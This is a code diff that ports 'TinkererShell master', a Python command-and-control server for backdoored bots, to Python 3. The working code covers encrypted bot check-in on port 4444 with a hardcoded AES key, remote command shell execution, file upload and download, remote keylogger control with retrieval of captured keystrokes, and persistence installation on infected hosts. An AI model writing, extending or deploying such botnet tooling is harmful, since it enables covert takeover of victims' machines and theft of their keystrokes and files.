@@ -3,31 +3,27 @@
 """TinkererShell master, a simple bots manager.\n"""
 
 # Written By Ananke: https://github.com/4n4nk3
-from socket import *
-from sys import exit
-import os
-import time
-import base64
 import cmd
-import threading
 import datetime
+import json
+import os
+import sys
+import threading
+import time
+from base64 import b64encode, b64decode
 from random import randrange
-# pycrypto
-from Crypto.Cipher import AES
+from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
 
-# Global variables
-global conn
-global cipher
-global EncodeAES
-global DecodeAES
-global connected_sockets
-global active_bot
+# pycryptodome
+# noinspection PyPackageRequirements
+from Crypto.Cipher import AES
 
 connected_sockets = []
 active_bot = 1000
 
 
 def connection_gate():
+    """Thread that keep accepting new bots, assigning ports, and passing them to other threads doing keep-alive.\n"""
     host = ''
     port = 4444
     # Socket definition
@@ -42,12 +38,12 @@ def connection_gate():
     while True:
         so = s
         conn_gate, addr = so.accept()
-        lengthcrypt = conn_gate.recv(1024)
-        expected_length = int(DecodeAES(cipher, lengthcrypt))
+        lengthcrypt = conn_gate.recv(1024).decode('utf-8')
+        expected_length = int(decode_aes(lengthcrypt))
         encrypted_received_data: str = ''
         while len(encrypted_received_data) < expected_length:
             encrypted_received_data += conn_gate.recv(1024).decode('utf-8')
-        clear_text = DecodeAES(cipher, encrypted_received_data)
+        clear_text = decode_aes(encrypted_received_data)
         logging(data_to_log=('Connection established with: ' + str(addr).split('\'')[1]), printer=True)
         while True:
             new_port = randrange(5000, 6000)
@@ -55,13 +51,13 @@ def connection_gate():
                 new_so = socket(AF_INET, SOCK_STREAM)
                 new_so.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
                 new_so.bind((host, new_port))
-                encrypted = EncodeAES(cipher, str(new_port))
+                encrypted = encode_aes(str(new_port))
                 # Send encrypted data's length encrypted
-                conn_gate.send(EncodeAES(cipher, str(len(encrypted))))
+                conn_gate.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                 # Sleep 1 second to let the receiver decrypt the length packet.
                 time.sleep(1)
                 # Send encrypted data
-                conn_gate.send(encrypted)
+                conn_gate.send(bytes(encrypted, 'utf-8'))
                 threading.Thread(target=handler, args=(new_so, new_port, clear_text)).start()
                 break
             except os.error as exception_gate:
@@ -72,16 +68,16 @@ def connection_gate():
 
 
 def handler(new_so, new_port, username):
+    """Keep-alive the connected bots.\n"""
     global connected_sockets
-    global active_bot
     new_so.listen(10)
     conn_handler, addr = new_so.accept()
     lengthcrypt = conn_handler.recv(1024)
-    expected_length = int(DecodeAES(cipher, lengthcrypt))
+    expected_length = int(decode_aes(lengthcrypt))
     encrypted_received_data: str = ''
     while len(encrypted_received_data) < expected_length:
         encrypted_received_data += conn_handler.recv(1024).decode('utf-8')
-    a = DecodeAES(cipher, encrypted_received_data)
+    a = decode_aes(encrypted_received_data)
     if a == username:
         logging(data_to_log=('Connection consolidated with: {}\t{}'.format(str(addr).split('\'')[1], username)),
                 printer=True)
@@ -91,13 +87,13 @@ def handler(new_so, new_port, username):
         position = len(connected_sockets) - 1
         while True:
             if position != active_bot:
-                encrypted = EncodeAES(cipher, 'KeepAlive')
+                encrypted = encode_aes('KeepAlive')
                 # Send encrypted data's length encrypted
-                conn_handler.send(EncodeAES(cipher, str(len(encrypted))))
+                conn_handler.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                 # Sleep 1 second to let the receiver decrypt the length packet.
                 time.sleep(1)
                 # Send encrypted data
-                conn_handler.send(encrypted)
+                conn_handler.send(bytes(encrypted, 'utf-8'))
             time.sleep(60)
     conn_handler.close()
 
@@ -117,27 +113,27 @@ def logging(data_to_log: str, printer=False) -> bool:
 
 def sender(data_to_send: str) -> bool:
     """Send a string to the connected bot. Make sure string is not empty in order to prevent reception exceptions.\n"""
-    if len(data_to_send) == 0:
+    if not data_to_send:
         data_to_send = 'Ok (no output)'
     # Encrypt data
-    encrypted = EncodeAES(cipher, data_to_send)
+    encrypted = encode_aes(data_to_send)
     # Send encrypted data's length encrypted
-    conn.send(EncodeAES(cipher, str(len(encrypted))))
+    conn.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
     # Sleep 1 second to let the receiver decrypt the length packet.
     time.sleep(1)
     # Send encrypted data
-    conn.send(encrypted)
+    conn.send(bytes(encrypted, 'utf-8'))
     return True
 
 
 def receiver(printer=False) -> str:
     """Receive encrypted data and return clear-text string.\n"""
     lengthcrypt = conn.recv(1024)
-    expected_length = int(DecodeAES(cipher, lengthcrypt))
+    expected_length = int(decode_aes(lengthcrypt))
     encrypted_received_data: str = ''
     while len(encrypted_received_data) < expected_length:
         encrypted_received_data += conn.recv(1024).decode('utf-8')
-    clear_text = DecodeAES(cipher, encrypted_received_data)
+    clear_text = decode_aes(encrypted_received_data)
     if printer is True:
         logging(data_to_log=clear_text, printer=True)
     return clear_text
@@ -171,7 +167,7 @@ def downloader() -> bool:
     if received_file_data != 'reachedexcept':
         try:
             downloaded_file_descriptor = open(local_filename, 'wb')
-            downloaded_file_descriptor.write(bytes(received_file_data))
+            downloaded_file_descriptor.write(bytes(received_file_data, 'utf-8'))
             downloaded_file_descriptor.close()
             logging(data_to_log=('File saved in ' + os.getcwd() + '\n'), printer=True)
         except Exception as exception_downloader:
@@ -197,7 +193,7 @@ def uploader() -> bool:
     except Exception as exception_uploader:
         logging(data_to_log=str(exception_uploader), printer=True)
         file_data = 'reachedexcept'
-    sender(file_data)
+    sender(file_data.decode('utf-8'))
     receiver(printer=True)
     return True
 
@@ -247,6 +243,7 @@ def keylogshower():
 
 
 def quit_utility() -> bool:
+    # noinspection PyPep8
     """Quit and terminate remote backdoor thread. If mailactivation thread is not running the bot gonna kill himself.\n"""
     global conn
     double_check = ask_input(phrase='Are you sure? yes/no\n')
@@ -260,9 +257,34 @@ def quit_utility() -> bool:
             else:
                 logging(data_to_log=response, printer=True)
         return True
-    else:
-        logging(data_to_log='Operation aborted\n', printer=True)
-        return False
+    logging(data_to_log='Operation aborted\n', printer=True)
+    return False
+
+
+def encode_aes(text_input):
+    """Encode a string and output an json in string form.\n"""
+    secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
+    cipher = AES.new(secret, AES.MODE_EAX)
+    ciphertext, tag = cipher.encrypt_and_digest(bytes(text_input, 'utf-8'))
+    lista = [ciphertext, tag, cipher.nonce]
+    json_k = ['ciphertext', 'tag', 'nonce']
+    json_v = [b64encode(x).decode('utf-8') for x in lista]
+    return json.dumps(dict(zip(json_k, json_v)))
+
+
+def decode_aes(json_input):
+    """Decode a string in json form and output a string.\n"""
+    try:
+        b64 = json.loads(json_input)
+        json_k = ['ciphertext', 'tag', 'nonce']
+        jv = {k: b64decode(b64[k]) for k in json_k}
+        secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
+        cipher = AES.new(secret, AES.MODE_EAX, nonce=jv['nonce'])
+        cleared = (cipher.decrypt_and_verify(jv['ciphertext'], jv['tag'])).decode('utf-8')
+        return cleared
+    except Exception as exception_decode:
+        print(exception_decode)
+        print("Incorrect decryption")
 
 
 def command_executer():
@@ -275,28 +297,26 @@ def tinkerer_menu():
 
 # =================================================================================================
 
+# noinspection PyUnusedLocal,PyUnusedLocal,PyPep8Naming,PyMethodMayBeStatic,PyMethodMayBeStatic
 class BotSwitcher(cmd.Cmd):
     """Bots selection handler.\n"""
     global active_bot
     global conn
-    global connected_sockets
     prompt = '\n(SHbots) '
 
     # ---------------------------------------------------------------------------------------------
     def do_SHbots(self, option):
         """SHbots\n\tList connected bots.\n"""
         printable_bots = 'Listing bots...'
-        for bots_counter in range(len(connected_sockets)):
-            if connected_sockets[bots_counter]['status'] is True:
-                printable_bots += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, connected_sockets[bots_counter]['ip'],
-                                                                  connected_sockets[bots_counter]['username'])
+        for bots_counter, bot in enumerate(connected_sockets):
+            if bot['status'] is True:
+                printable_bots += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
         logging(data_to_log=printable_bots, printer=True)
 
     # ---------------------------------------------------------------------------------------------
     def default(self, command):
         global active_bot
         global conn
-        global connected_sockets
         if command.isdigit() is True:
             try:
                 if connected_sockets[int(command)]['status'] is True:
@@ -320,10 +340,7 @@ class BotSwitcher(cmd.Cmd):
     # ---------------------------------------------------------------------------------------------
     def do_SHquit(self, option) -> bool:
         """SHquit\n\tQuit and close the connection\n"""
-        if quit_utility() is True:
-            return True
-        else:
-            return False
+        return quit_utility()
 
     def emptyline(self):
         pass
@@ -340,6 +357,7 @@ class BotSwitcher(cmd.Cmd):
 
 # =================================================================================================
 
+# noinspection PyUnusedLocal,PyPep8Naming,PyMethodMayBeStatic
 class CommandExecutorInput(cmd.Cmd):
     """Command Executor Input handler.\n"""
 
@@ -402,6 +420,7 @@ class TinkererShellInput(cmd.Cmd):
 
     # ---------------------------------------------------------------------------------------------
     def do_SHkeylog(self, option):
+        # noinspection PyPep8
         """SHkeylog [option]\n\tstatus: Show status of the keylogger\n\tstart: Start keylogger\n\tstop: Stop keylogger\n\tdownload: Download keylogged data to local machine and delete it from remote bot\n\tshow: Show downloaded keylogged data\n"""
         if option:
             if option == 'status':
@@ -423,22 +442,26 @@ class TinkererShellInput(cmd.Cmd):
             print('Aborted: an option is required\n')
 
     # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
     def do_SHdownload(self, option):
         """SHdownload\n\tDownload a file\n"""
         downloader()
 
     # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
     def do_SHupload(self, option):
         """SHupload\n\tUpload a file\n"""
         uploader()
 
     # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
     def do_SHexec(self, option):
         """SHexec\n\tUse remote system command shell\n"""
         command_executer()
 
     # ---------------------------------------------------------------------------------------------
     def do_SHpersistence(self, option):
+        # noinspection PyPep8
         """"SHpersistence [option]\n\tstatus: Show status of the persistence module\n\tenable: Enable persistence installation\n\tdisable: Disable persistence installation\n"""
         if option == 'enable':
             sender('SHpersistenceenable')
@@ -453,6 +476,7 @@ class TinkererShellInput(cmd.Cmd):
             print('Aborted: unknown option\n')
 
     # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
     def do_SHreturn(self, option):
         """SHreturn\n\tReturn to TinkererShell bot selection mode.\n"""
         logging(data_to_log='Returning to TinkererShell bot selection mode...\n', printer=True)
@@ -477,7 +501,7 @@ if __name__ == '__main__':
         chiusura = input(
             '[-] sessionlog.txt access to log file denied.\nTry running this program as root... Press Enter to '
             'exit...')
-        exit(0)
+        sys.exit(0)
     try:
         f = open('sessionlog.txt', 'a')
         f.write(
@@ -485,17 +509,6 @@ if __name__ == '__main__':
         f.close()
     except Exception as exception:
         print(exception)
-
-    # Cryptography
-    BLOCK_SIZE = 32
-    PADDING = '{'
-    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
-    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
-    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).decode('utf-8').rstrip(PADDING)
-    # Super secret password
-    secret = '4n4nk353hlli5w311d0n3andI1ik3it!'
-    cipher = AES.new(secret)
-    del secret
 
     threading.Thread(target=connection_gate).start()
 
